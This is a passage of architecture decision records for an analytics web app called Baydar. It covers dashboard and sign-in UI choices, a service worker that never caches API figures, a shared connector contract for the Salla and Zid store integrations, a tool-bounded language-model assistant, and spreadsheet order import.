   route to its data.

4. **A KPI card opens in place rather than navigating.** It takes the row, draws its own
   series as a real chart with an axis, a tooltip and the frame's "view as table" toggle,
   and the other three cards move down around it. This closes a gap that was a deliberate
   hole: six of twelve metrics have no `DESTINATIONS` entry and so no way in at all.

   `ChartFrame` gained a `bare` prop for it — the same word, and the same reason, as the one
   `DataTable` already has. A card inside a card is two borders saying one thing.

5. **One keyboard listener, and chords rather than bare letters.** There were three
   independent `keydown` listeners on `window`, each deciding for itself what counts as "the
   reader is typing"; a fourth was the point at which two would disagree. `g` then a letter
   navigates — a bare letter would fire under the hands of anyone tabbing a table — `?`
   lists everything, and no modified key is taken from the browser.

6. **`Ctrl/⌘+K` opens a palette, not a text field.** It used to focus the field in the top
   bar. That was right until the field grew commands: a dropdown hanging off the top-right
   corner is the wrong shape for a list someone is reading and choosing from, and the wrong
   corner entirely for a reader whose language starts at the other edge. The dialog already
   existed for narrow screens; it is now the shortcut's target at every width, and the bar
   keeps its field for the reader who reached for a mouse.

**Rejected: per-widget error states on the three dashboard charts.** `ChartFrame` supports
`error`/`onRetry` and the three dashboard charts do not forward them, which reads like an
omission. It is not: all three are fed by one `/dashboard` request, so there is exactly one
failure and the page-level state is where it belongs. Wiring three retry buttons that would
always appear together, and always retry the same call, would be ceremony.

**Rejected: a dark theme in this pass.** Every token has a dark value and `contrast.test.js`
holds both to AA, but no reviewer has looked at the dark ground on a real screen. Shipping a
toggle would hand readers a theme nobody has read a number on.

**Consequences.**

- **`gsap/Flip` may be imported in `hooks/useFlip.js` and nowhere else**, exactly as the core
  may be imported only in `hooks/useGsap.js`.
- **The palette's commands are built in `AppShell`**, because each acts on something the
  shell holds — preferences, focus mode, the period in the URL. The search engine stays a
  search engine.
- **`e2e/shell.spec.js` changed deliberately.** `Ctrl+K` now opens a dialog, so the spec
  scopes its combobox to it; at a wide width there are two fields named Search and only one
  of them is the palette.
- **A metric the server sends no series for draws no sparkline and cannot be opened.**
  `units_sold` is the case today. The card keeps its height either way, so a row does not
  become ragged because one metric has no history.

## Open decisions

These need an answer from the project owner before the phase that depends on them.

| # | Question | Default if unanswered | Needed by |
| --- | --- | --- | --- |
| ~~**OD-1**~~ | Confirm single-business (ADR-001). | **Resolved Phase 01** — proceeded single-business on the documented default. No `businesses` table, no tenant column. Reversible via ADR-001's migration path, but the cost rises with every table added, so raise it now if it is wrong. | — |
| ~~**OD-2**~~ | Hosts-file requirement vs BFF proxy. | **Resolved Phase 01 — the question dissolved.** There is no hosts-file requirement; see ADR-002's revised cost. Sanctum SPA kept. | — |
| ~~**OD-3**~~ | Currency and timezone for seed data. | **Resolved Phase 01** — seeded `BHD`, `Asia/Bahrain`, fiscal year starting January, in `business_settings`. Changing them is an Owner editing two fields, not a migration. | — |
| **OD-4** | Deployment target. Vercel plus a managed PHP host? A single VPS? It affects queue, cache and cookie-domain configuration, not application code. | Decide in Phase 06 | Phase 06 |
| **OD-5** | Should Staff see any analytics at all, or none? Currently none (ROLES_AND_PERMISSIONS.md §3.1). A revenue-only analytics view is a separate surface with its own design and tests. | Staff get no analytics module | Phase 04 |
| **OD-6** | Order reference format. `ORD-2026-000418` is assumed; some businesses require a specific scheme. | `ORD-{year}-{6-digit sequence}` | Phase 02 |
| **OD-7** | Does the business profit on shipping (ADR-013)? If so, Net Revenue's definition changes. | Shipping excluded from revenue | Phase 04 |

---

## ADR-032 — The door argues standing still

**Status:** Accepted (2026-10)
**Affects:** `features/auth/AuthLayout.jsx`, `RecordStream.jsx`, `LedgerScene.jsx`,
`DemoAccounts.jsx`, `app/(auth)/login/page.jsx`
**Amends:** `UI_UX_DIRECTION.md` §5

**Context.** The sign-in panel was built as three stacked blocks — mark, sentence, figure —
distributed by `justify-between`. Measured at 1600×980 that left roughly 120px of empty ink
under the logo and 240px under the tagline: about a third of the panel was nothing.

Worse, the product's thesis lived entirely inside a three-second animation. `LedgerScene`
opened with ledger rows arriving, folded them away, and raised a figure in their place —
a good argument, told once. Anyone who reloaded, switched back to the tab, or simply looked
up a moment late met the state the animation ends in: a bar chart. Every analytics product
on the market has one of those, and it is the single screen a visitor from a portfolio sees
first.

The demo build had a second problem of the same kind. Five equal buttons in a bordered box,
each repeating the words "Sign in", sat above a complete email form — two full paths
competing for one visitor, with nothing to say which was meant for them.

**Decision.**

1. **The voids become the argument.** Records now drift down the band between the tagline
   and the figure and dissolve into it (`RecordStream`), so top to bottom the panel reads
   mark → sentence → records → figure. The claim is legible without watching anything; the
   motion only makes it move.

2. **Only the stream loops. The figure is drawn once and rests.** That split is the claim,
   not a performance budget: records are what keep arriving, the figure is the standing
   answer. A panel where everything cycled forever is a screensaver behind a password field.

3. **The stream is HTML, and it is pinned left in both languages.** HTML because an SVG
   covering a panel whose aspect ratio runs from about 0.75 to 1.1 must either crop or
   distort, and these are rounded bars. Pinned left — `left`, not `inset-inline-start`,
   the codebase's second deliberate physical side after the password reveal button —
   because the stream and the figure are one drawing and that drawing is left to right in
   both languages, like every real chart in Baydar. Mirrored with the page, the records
   landed on the figure's tallest columns in Arabic and its shortest in English: the same
   picture reading as two different ones.

4. **A looping element still renders its resting state.** Everything else on the page
   animates *in* to a final state, so markup with no timeline run is the finished thing.
   A loop has no final state, and the obvious implementation — start at `opacity: 0`, let
   the loop raise it — leaves a reader who asked for less motion looking at an empty band
   where the argument should be. Each record therefore renders at the opacity it holds for
   most of its life and the tween drives it from there. Tested, because it fails silently.

5. **The demo has one door, and it is wider than the others.** Almost everyone arriving
   from a portfolio wants the owner's view: it is the only role that can see cost and
   margin. So the owner is the page's primary action, the other four roles are a quiet row
   beneath it named by role alone — the repeated verb carried no information once the first
   button had said it — and the email form folds behind a disclosure. **Only on the demo:**
   a build without `NEXT_PUBLIC_DEMO_MODE` has no shortcuts to compete with the form, and a
   disclosure there would charge a click to everyone who signs in each morning.

**Rejected.**

- **Dashboard fragments behind the door** — a real KPI card with its figures withheld until
  sign-in. The most literal version of the claim, and the one most likely to read as a page
  stuck loading.
- **Gridlines carried the full height of the panel.** Tried, and one of them ruled a line
  through the middle of the headline. They belong to the figure and scale with it.
- **Tying the stream to the form** — a record landing per field filled. Clever once, and a
  cost every morning for the staff who sign in daily.

**Not done here.** The focus ring (`--focus-ring`, a dark bronze) sits on the autofocused
email field at first paint and reads as a validation warning rather than a cursor. It is the
house focus colour on every screen, so changing it is a palette decision, not a login one.

---

## ADR-033 — The sign-up fields say what they are for

**Status:** Accepted (2026-10)
**Affects:** `features/auth/RegisterForm.jsx`, `AccountPreview.jsx`, `PasswordMeter.jsx`,
`lib/person.js`, `AppShell`, the dashboard page

**Context.** Sign-up was four bordered boxes that said nothing until they said no. Submitted
empty, all four turned red at once — the first time a reader learned any of them was
required.

Two of the rules behind them were invisible rather than merely unstated.

The first is the password. `Password::defaults()` is `min(12)->uncompromised()` outside the
test environment, so a password long enough to pass the only rule on screen is still refused
if it has appeared in a known breach — after a round trip, for a reason nothing prepared
anyone for. The passwords most likely to be in a breach corpus are exactly the ones someone
has used for years and reaches for first.

The second is quieter. The product takes the first letter of the first two words for an
avatar, and greets a person by their first name alone. Someone typing "Ahmed Al Hawajri" has
no way of knowing the product will call them "Ahmed" until they are already inside it.

**Decision.**

1. **The form previews the account it is about to create.** As the two names are typed, it
   draws the top bar's chip and the dashboard's greeting — built from `lib/person.js`, the
   same functions those screens call. `initials` and `greeting` moved out of `AppShell` and
   the dashboard page for this, because **a preview that imitates the rules instead of
   running them is a promise the product can break silently**: change the greeting to use a
   full name and a copied preview goes on cheerfully showing a first name. The browser suite
   asserts the first-name rule on both screens in one run, which is the only place that
   promise can actually be tested.

2. **The password meter measures length and nothing else.** Not a strength meter: scoring a
   password out of four means inventing rules the client does not own, which ADR-012 forbids
   precisely because the client then either contradicts the server or agrees with it until
   one of them changes. The bar measures the one rule already stated on screen, and the form
   now also *states* the breach check instead of letting it arrive as a refusal. The check
   itself stays on the server.

3. **"All four are needed" is said once, before anything is typed.** Every field here is
   required, so marking each label repeats one word down the form and still leaves the rule
   to be inferred from its absence elsewhere.

4. **No icons inside the fields.** §2 bans decorative icon sets, and the default answer to a
   visual effect is no. Everything added here is information: a preview, a measure, a
   sentence about a rule. The only two icons are a status tick and the chip's house glyph.

**Missing from the API.** The server does not publish its password policy, so `12` is
restated in `RegisterForm` as a constant that names `AppServiceProvider::definePasswordPolicy`
— stated, never enforced, there. A short password still fails on the server. If the policy
changes, the two drift silently; an endpoint returning the minimum, or the rule's own message,
would remove the duplication.

**Not done here.** `initials` on an Arabic name yields two isolated letters, and Arabic
letters are cursive — "أحمد الحواجري" becomes "أا", which reads as a broken word rather than
a monogram. The preview surfaced it; it is the shell's avatar on every screen, so it is a
product-wide question, not a sign-up one.

---

## ADR-034 — A phone gets cards; the table is a desk instrument

**Status:** Accepted (2026-11)
**Affects:** `components/data/DataTable.jsx`, `AppShell`, `Button`, `Field`, `Tooltip`,
`KpiPanel`, `RecentOrdersCard`, the four list screens that name a primary column

**Context.** Measured at 390px, no page scrolled sideways — so nothing looked broken — but
every table inside one did: orders 732px, users 755px, activity 952px. An order reference
wrapped onto three lines, the customer name onto two, and the total sat off-screen. You could
not see who an order was for and what it came to at the same time.

Two more things gave the same impression for less reason. The first thing a phone user met
was a one-time hint saying to press `Shift + F`, with a focus-mode button beside it — and
focus mode's whole job is hiding the sidebar, which below `md` is already a drawer, so on a
phone it removed the notification bell and nothing else. And the house control scale, 28 /
32 / 40px, is right at a desk and under every touch-target minimum: the info dot beside a
KPI was a 14x14 button.

**Decision.**

1. **Below `md`, each row is a card.** Same cells, same `cell` renderers, stacked: the first
   column titles it, the primary figure sits opposite, the rest become labelled rows. A
   different arrangement of the table, not a second table.

2. **The table names its own headline figure (`primary`), because convention failed twice.**
   The *last* numeric column put gross profit at the head of an order card with the order's
   own total three rows down. The *first* numeric column put the **date** there — `numeric`
   on this table means "tabular, end-aligned, never wrapped", which a date also is. Nothing
   in a column's config separates money from a timestamp, so nothing in the component can.
   Customers, activity and users name none and correctly show no figure.

3. **Card click does what row click does, and no more.** The desktop `<tr>` carries a bare
   `onClick` with no role and no tabindex — a mouse convenience, with the first cell's link
   as the keyboard path. The card keeps exactly that bargain rather than dressing a div up
   as a button and inheriting a promise the table never made.

4. **Focus mode is a desktop concept, stated as one.** Not a hidden button: `focused` is the
   stored preference *and* a wide screen, so nothing can be stuck on from another device,
   and the hint, the controls and the two keyboard-only palette commands all go with it.
   The preference itself is untouched — someone who turns it on at a desk finds it on when
   they return.

5. **44px minimum below `md`, desk density unchanged.** `min-h-11 md:min-h-0` on buttons and
   controls, `size-11 md:size-9` on the bar's icons. The 14px info dot grows through a
   pseudo-element instead, so not a pixel of layout moves — and only on a narrow screen,
   because an invisible 46px box around it would start swallowing clicks meant for its
   neighbours.

**Rejected.** Hiding columns per screen on a phone: seven screens would each need a
judgement about which of its columns a reader can live without, and the one dropped is
always the one somebody wanted. Only `RecentOrdersCard` drops a column — the date, from a
list already ordered by date and captioned as such.

---

## ADR-035 — The sign-in page is one screen, and the graphic is the argument

**Status:** Accepted (2026-11)
**Affects:** `features/auth/AuthLayout.jsx`, `AuthField.jsx`, `LedgerScene.jsx`,
`formStyles.js`, both auth forms, `AccountPreview`, `PasswordMeter`, `DemoAccounts`
**Amends:** `UI_UX_DIRECTION.md` §5 (the form is no longer on light ground)

**Context.** Two layouts came before this one. The first was two panes — the form on light
ground, a panel of brand ink beside it — which is the front door of almost every business
product: Stripe, Linear, Notion, Vercel. The second was a ledger sheet, which escaped that
shape but scrolled, and a page that scrolls before anyone has typed anything is a page that
did not decide what mattered.

Reviewing the published galleries of login design was useful mostly as a negative result:
they repeat the same two shapes, and what they name as current is full-bleed imagery behind
the form, dark mode, and micro-animation. None of it differentiates anything, because all of
it is available to everyone. What is not available to anyone else is this product's own
argument.

**Decision.**

1. **One viewport, and it never scrolls.** `h-dvh` + `overflow-hidden` on the page. The
   inner column carries `overflow-y-auto` as a valve, not a layout: measured at six sizes
   from 1920×1080 to 360×640, it never engages and the submit button is fully on screen at
   every one. It exists because a 360px phone with the keyboard open has perhaps 300px of
   height, and clipping a password field out of reach is worse than a scrollbar.

2. **The graphic is the thesis at wallpaper scale.** Records fall across the field and the
   figure they add up to stands on a horizon at the foot — the same claim the sentence
   makes, drawn. A stock illustration would have been the thing everyone else does.

3. **It arrives and then it stops.** No `repeat` anywhere. An endless loop behind a password
   field keeps a phone's compositor awake for as long as the page is open, and WCAG 2.2.2
   asks for a visible pause control once moving content runs past five seconds — a control
   this screen should not have to carry. Everything settles in about 2.5 seconds.

4. **The clearing is painted last, and that is not a detail.** Drawn before the figure it
   masked only the records, and the figure's trace ran straight across the email field. Text
   is never read over a graphic.

5. **The inputs stay light on the ink, deliberately.** A browser paints its own background
   into a field it has autofilled and no stylesheet can override it, so a transparent input
   on ink becomes a pale rectangle the moment a password manager fills it. Labels, hints and
   rules take the on-brand tokens; the submit button turns white, because the brand navy it
   used to be is now the page it stands on.

6. **One `h1`, and it is the form's title.** The font test reads the FIRST `h1` in the
   document and asserts it is drawn in IBM Plex Sans Arabic. A headline promoted to `h1` for
   visual weight would silently move that assertion onto the wrong element. The sentence is
   a `<p>` that happens to be large.

7. **The figure is decorative and says so.** It carried `role="img"` and a description, and
   now sits inside an `aria-hidden` layer — a description nobody can reach, and a key kept
   alive in two dictionaries for no reader. Both are gone.

**New token.** `--success-on-brand` (#4ade80, both themes): `--success` is a dark green
chosen to read on white and it disappears into navy. It is the one green the password meter
can use while standing on ink, and `contrast.test.js` now verifies the pair.

**Rejected.** A light ground with a faint field, which is what §5 prescribed — it keeps the
form safe but cannot carry a screen-sized graphic without the graphic becoming wallpaper
texture rather than an argument. The owner chose the ink.

**Measured, not assumed.** Three faults in this work were found by screenshot and
measurement rather than by looking at the code: the trace crossing the email field, a figure
730px tall on a 900px screen, and a short-screen threshold set at 700px that missed 720 —
which is the height the browser suite itself runs at.
## ADR-036 — The installed application, and a worker that stands down where it is wrong

**Status:** Accepted (2026-11)
**Affects:** `app/manifest.js`, `public/sw.js`, `public/offline.html`,
`features/pwa/ServiceWorker.jsx`, `brand.config.js`, `tests/serviceWorker.test.jsx`
**Supersedes:** nothing — this record was missing. Six source files cited "ADR-028" for the
installed application; ADR-028 is the Salla connection, and the PWA decision had never been
written down. The citations now point here.

**Context.** Baydar installs: there is a manifest, an icon set, an offline page and a
service worker. A worker in front of a business intelligence tool is the part worth arguing
about, because every tutorial on the subject recommends exactly the thing that would break
this product.

**Decision.**

1. **Not one figure is ever cached.** Every request under `/api/` goes to the network, and
   if the network is gone the request fails exactly as it would without a worker — the
   reader sees the application's own error state, which says it could not reach the server.
   A cache-first worker here is a machine for showing someone yesterday's revenue as though
   it were today's, silently, with nothing to notice. The product's whole claim is that its
   figures are current.

2. **A navigation offline gets a page that admits it**, not a cached dashboard. Last week's
   numbers presented as this morning's are worse than no answer.

3. **The shell is cached, on one stated ground:** Next fingerprints its JavaScript, CSS and
   fonts by content, so a changed file has a different URL and a cached copy can never be
   the wrong one. That assumption is the licence for the whole cache.

4. **Therefore the worker runs in production only — and unregisters itself everywhere
   else.** The assumption in (3) holds for `next build` and is false for `next dev`, which
   serves chunks from stable paths and changes what is behind them on every save.

**What (4) replaced, and why "skip" was not enough.** The component used to return early in
development. That reads like the same thing and is not: a worker is registered against an
ORIGIN and stays registered until something removes it, and a page that merely declines to
register one removes nothing.

This project puts a production build on the development origin as a matter of routine — the
browser suite's `webServer` runs `npm run build && npm run start` on `localhost:3000`
(`playwright.config.mjs`). So a single `npx playwright test` left a worker installed on the
port `npm run dev` serves from, permanently. It then kept its side of a bargain that does
not hold there, and the owner's browser rendered the sign-in page assembled from two builds
weeks apart: current markup asking a months-old dictionary for keys it had never heard of
(`reset.forgotLink` and `login.copyright` printed raw where sentences belonged), the product
under its previous name, and a stylesheet whose class names no longer matched anything — so
the page arrived with no styling at all.

Development now unregisters every worker on the origin and deletes its caches. The caches go
too: an unregistered worker stops answering fetches, but its Cache Storage survives on disk,
and a dead copy of an old build left there is how this returns the next time anybody
registers a worker on the port. One reload is still needed after it runs, because the page
that runs it was itself served by the worker being removed.

**Measured, not assumed.** The fix was verified in a real browser rather than by reading it:
a worker registered by hand against the dev server, then one page load — registrations 1 → 0,
caches 1 → 0, the title back to "Baydar" and no raw translation keys left on the page.

**Rejected.** Telling the owner to clear site data. It works once and teaches nothing, and
the next `playwright test` run puts it back.

---

## ADR-037 — One connector contract, proven by moving Salla onto it

**Status:** Accepted (2026-11). Salla moved onto it with all 174 of its tests untouched, and Zid
was built on it second. "What the second provider taught" below records how it changed.
**Affects:** `app/Domain/Integrations/` (`Connector`, `Connectors`, `Backfill`, `Import/`,
`Salla/`, `Zid/`), `config/integrations.php`, `opsight:import`
**Builds on:** ADR-027 (integration plumbing), ADR-028 (the Salla connection), ADR-030
(catalogue first)

**Context.** ADR-027 shipped the parts that are the same for every provider: encrypted tokens,
a verified and idempotent webhook receipt, a queued handler. It deliberately left the rest to
be learned from a real provider. Salla has now taught it. A store authorises through OAuth.
Its tokens are refreshed before they expire. The catalogue is walked before the orders
(ADR-030). Each record is mapped into Baydar's own vocabulary (`SallaMap`). A reconciler then
compares against totals the provider computed independently. Zid and Foodics ask for the same
steps, and so does any accounting system that is meant to supply expenses.

**Proposed decision.**

1. A `Connector` contract covering authorisation and refresh, a paged backfill in dependency
   order, webhook handling (the existing `WebhookProvider` becomes one part of it), and
   mapping into Order, Product, Customer and, for accounting sources, Expense.
2. **Salla moves onto the contract before any second provider is written**, and every
   existing Salla test passes unchanged. A contract that needs Salla bent to fit it is wrong,
   and moving Salla first is what exposes that.
3. Shared behaviour stays outside each connector and is not copied into it: idempotency on
   `(source, external_id)`, the rule that imported orders do not move stock (ADR-027), and the
   rule that an erased customer is never repopulated (ADR-026).
4. A unified-API vendor, when one is adopted for the global long tail, is **one connector**
   behind the same contract, not a second integration model.

**Alternatives.** Copy the Salla classes per provider: fastest for the second provider, but the
idempotency and erasure rules would then live in several places and drift apart. Adopt a
unified API for everything: it does not cover the regional platforms this product is for.

**Revisit when:** a provider's model cannot be expressed through the contract without a flag
that only it uses.

**What was built.** The contract ended up smaller than proposed. It covers where a store's records are
(`catalogue`, `orders`) and what one means (`importProduct`, `importOrder`). Each provider's
mapper produces an `ImportedOrder` or `ImportedProduct`, and `RecordImportedOrder` and
`RecordImportedProduct` do the writing, so the shared rules in (3) exist once. Two things stayed
OUT of the contract, against the proposal, because the two real providers differ on them too much:

- **Webhooks** remain `WebhookProvider`. Salla signs each delivery with an HMAC of the body. Zid signs
  nothing and offers only Basic Auth credentials the app chooses when it registers a webhook.
  That is weaker: it proves who sent a delivery, not what it said. It is accepted because it is the
  only mechanism Zid has, and a forged delivery can only restate an order that the next backfill
  overwrites from Zid's API.
- **Connecting** stays with each provider. Salla's Easy mode delivers tokens in an install event
  with no way to tell whose they are, hence ClaimStore. Zid runs a standard OAuth redirect and
  returns our `state`, which is bound to the signed-in user and business. The Zid flow is the
  stronger of the two.

**What the second provider taught.**

1. `importProduct` began as `?Product`, because a Salla catalogue entry is one product. A Zid
   product with options is one entry whose variants are what is sold, and what order lines name.
   It now returns nothing.
2. A provider can need more than one credential. Zid needs `authorization` and `access_token` on
   every call, and its refresh token dies two years before the tokens it renews. The migration adds
   `authorization_token` and `refresh_token_expires_at`, and refresh is driven by the earlier of
   the two expiries.
3. Moving Salla surfaced two faults it already had, both now fixed with tests. A delivery
   without `items` emptied the order's lines. A single-method payment was mapped twice and filed
   as `other`.

**Not yet seen working against a live Zid store**, because no Zid partner app exists for this
installation. The assumptions most likely to be wrong are each named in one place: the headers and
order pagination (`ZidClient`), the timezone of Zid's timestamps (`ZidMap::TIMEZONE`), and how a
delivery's kind is recognised (`ZidWebhooks::event`).

---

## ADR-038 — The language model explains figures; it never produces one

**Status:** Accepted (2026-11), built as Ask Baydar. See "What was built" below.
**Affects:** `app/Domain/Assistant/`, `AssistantController`, `/assistant`; later, the morning brief
and any MCP server
**Builds on:** ADR-010 (rule-based insights), the role matrix in ROLES_AND_PERMISSIONS.md

**Context.** The product's claim is that its figures can be trusted: decimals stored as
strings, money rounded by `App\Support\Money`, every metric defined in METRICS.md. A language
model asked "what was my margin last Ramadan?" will produce a fluent number whether or not it
has one. A wrong figure in a confident sentence does more damage than a blank tile.

**Proposed decision.**

1. **The model has no route to a figure except a tool.** Its tools are the existing domain
   functions (`MetricCalculator`, `TimeSeries`, `Breakdown`, `InsightEngine`, `Comparison`).
   They return values already computed and rounded. The model may choose which to call, and
   compare and describe the results. It does not do arithmetic on money.
2. **Tools run as the asking user.** They resolve under that user's tenant and role, exactly as
   the API does, so a Staff user's chat has no tool that returns cost or margin. This is
   enforced by which tools are registered for the role, not by instructions in a prompt.
3. **Every figure in an answer is traceable** to the tool call and the period that produced
   it, and the interface shows that period beside the answer.
4. **ADR-010 stands.** The insight rules remain the detectors. The model words their output
   and links rules that fired together. It does not invent new alerts.
5. Model calls are metered per business, and business data is not used to train any model.

**Alternatives.** Text-to-SQL over the database: flexible, but it reaches past the tenant and
role scopes and recomputes metrics that already have one tested definition. A model left to
summarise a dashboard screenshot: it cannot be audited.

**Revisit when:** merchants repeatedly ask questions the tools cannot answer. The fix is then a
new tool with a tested definition, not a looser model.

**What was built.** Five tools: summary, trend, breakdown, insights and stock risks. Each is a thin
call into `MetricSummary`, `TimeSeries`, `Breakdown`, `InsightEngine` or `MetricCalculator`, made as
the asking user. For a role without `metrics.view_cost`, the cost metrics are absent from the tools'
allowed values, so (2) holds by construction. The assistant is open to `analytics.view`. Points
the proposal did not settle:

- **The history is the server's.** Conversations are stored. A history sent back by the browser could
  carry invented tool results, so the client sends only a question and a conversation id. A
  conversation is its author's alone.
- **It stops.** There is a cap of six tool rounds per question, and a monthly token ceiling per business
  (`ASSISTANT_MONTHLY_TOKENS`) that is checked before the model is called.
- **Cache-stable prefix.** The system prompt and tool list are fixed text per role. Today's date
  travels with each question instead, and a test requires the prefix to be identical across days and
  users.
- **The model.** Claude Opus 5.5 at effort `medium` is the default, through the official PHP SDK
  (`anthropic-ai/sdk`). The model is configuration, because choosing a cheaper one is a decision about
  answer quality. Server-side fallbacks (`'default'`) retry a classifier refusal on a model the server
  picks.

**Not yet run against the live API**, because no key existed while it was built. `ClaudeModelTest`
runs the real SDK through a recording transport and checks the outgoing request and the parsing of
a reply in wire format, but it cannot show answer quality. Run a handful of real questions in both
languages before showing it to a merchant.

---

## ADR-039 — Importing from a file: all or nothing, safe to repeat, no library

**Status:** Accepted (2026-11)
**Affects:** `app/Domain/Imports/`, `FileImportController`, `/settings/integrations/import`
**Builds on:** ADR-037 (the shared writers)

**Context.** Many merchants in the target segment have no online store to connect. They sell over
WhatsApp and Instagram, and their orders live in a spreadsheet. Phase A promised them an import.

**Decision.**

1. **A file is one more source, not a separate path.** Rows become `ImportedOrder` and
   `ImportedProduct`, written by the same `RecordImportedOrder` and `RecordImportedProduct` as Salla and
   Zid. Idempotency, stock left alone and erased customers staying erased hold without being written a
   third time.
2. **All or nothing.** Every row is checked before anything is written, and the write is one
   transaction. Half an import is the worst outcome, because the owner cannot tell which half they have.
3. **Safe to upload again.** The identity is `(source = 'file', external_id = order number)`, so the
   owner's natural move after a mistake, fixing the spreadsheet and uploading it again, corrects
   rather than doubles.
4. **One row per line.** Orders are read the way every store export lays them out: rows sharing an
   order number are one order, and order-level columns come from its first row.
5. **No spreadsheet library.** An `.xlsx` is a zip of XML, and PHP ships both readers. The fifth backend
   dependency would have served one screen.
6. **Stateless.** Preview and import each carry the file, so no spreadsheet of customers' phone numbers
   is kept on the server between requests.
7. **Gated by `integrations.manage`.** It is the same act as connecting a store: bringing a body of
   records in from outside.

**Defaults a file cannot state, chosen and written down.** Dates are read day first, in the business's
timezone. A blank status is a completed sale. A completed sale is paid, and a cash-on-delivery order
still on its way is owed. A product file must give a price, because a blank one read as zero would
reprice an existing product. A blank cost leaves the existing cost alone.

**Rejected.** Writing the good rows and reporting the bad: easier to build, and it leaves the owner
reconciling a partial import by hand. Parsing in the browser: it puts the rules in two places, and
the server must check everything anyway.

**Revisit when:** files routinely exceed the 20,000-row cap or the request's five minutes. The answer
is then a queued import with progress, not a larger cap.
